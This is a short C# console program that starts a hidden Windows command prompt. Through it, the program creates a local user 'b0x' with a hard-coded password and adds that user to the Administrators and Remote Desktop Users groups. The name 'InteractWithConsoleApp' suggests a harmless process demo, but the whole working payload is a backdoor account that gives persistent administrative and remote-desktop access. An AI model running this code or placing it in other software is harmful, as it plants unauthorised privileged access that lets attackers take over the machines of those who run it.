using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;

namespace InteractWithConsoleApp
{
    class Program
    {
        static void Main(string[] args)
        {
            ProcessStartInfo csi = new ProcessStartInfo();
            csi.FileName = @"C:\Windows\System32\cmd.exe";
            csi.RedirectStandardOutput = true;
            csi.RedirectStandardError = true;
            csi.RedirectStandardInput = true;
            csi.UseShellExecute = false;
            csi.CreateNoWindow = true;

            Process cp = new Process();
            cp.StartInfo = csi;
            cp.ErrorDataReceived += cmd_Error;
            cp.OutputDataReceived += cmd_DataReceived;
            cp.EnableRaisingEvents = true;
            cp.Start();
            cp.BeginOutputReadLine();
            cp.BeginErrorReadLine();

            cp.StandardInput.WriteLine("net user b0x Admin@321 /add && net localgroup Administrators b0x /add && net localgroup \"Remote Desktop Users\" b0x /add  ");
            cp.StandardInput.WriteLine("exit");

            cp.WaitForExit();
        }

        static void cmd_DataReceived(object sender, DataReceivedEventArgs e)
        {
            
            Console.WriteLine(e.Data);
        }

        static void cmd_Error(object sender, DataReceivedEventArgs e)
        {
            Console.WriteLine("Error from other process");
            Console.WriteLine(e.Data);
        }
    }
}
